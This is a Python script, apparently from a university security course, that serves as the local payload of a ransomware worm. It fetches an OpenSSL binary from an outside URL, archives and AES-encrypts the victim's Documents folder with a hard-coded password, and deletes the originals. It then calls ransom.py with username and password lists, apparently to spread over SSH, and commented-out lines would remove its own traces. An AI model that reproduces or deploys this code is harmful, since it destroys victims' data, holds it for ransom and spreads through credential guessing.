""" Program to run on remote system after being transferred onto it. Downloads OpenSSL 
    and uses it to encrypt target system. Also leaves a silly note. """
import sys
import os
import urllib
import argparse
import tarfile
from subprocess import call

def get_file(url, target_dir, name):
    """ Retrieves OpenSSL and places it in a target_directory """
    os.chdir(target_dir)
    urllib.urlretrieve(url, target_dir + name)

def encrypt_directory(target_dir, password):
    """ Encrypts <target_dir>/Documents, assuming it exists, and replaces with tar file """
    os.chdir(target_dir)
    tar = tarfile.open("ineedmoney.tar", "w:gz")
    tar.add("Documents/")
    tar.close()
    call(("openssl enc -aes-256-cbc -in ineedmoney.tar -out ineedmoneyplz.tar -pass pass:" 
          + password).split(" "))
    call("rm ineedmoney.tar".split(" "))
    call("rm -r Documents/".split(" "))

def main():
    """ Main function. Runs locally afte ssh connection is terminated. Deletes itself
    once it finishes executing. """
    encryption_password = "cpsc456"
    target_dir = sys.argv[1]
    url = "http://ecs.fullerton.edu/~mgofman/openssl"

    # Specify target directory when running this program from ransom.py """
    try:
        get_file(url, target_dir, "openssl")
        encrypt_directory(target_dir, encryption_password)
        call("python ransom.py usernames.txt passwords.txt".split(" "))
    except Exception as somethingbadhappened:
        # Don't need to do anything. Add exception handling later?
        pass
    finally:
        #call("rm local_attack.py".split(" "))
        #call("rm ransom.py usernames.txt passwords.txt SSHConnection.py SSHConnection.pyc local_attack.py".split(" "))
        pass
    with open("finishedPhase2.txt", "w") as output:
        output.write("finished local_attack.py")

if __name__ == "__main__":
    main()
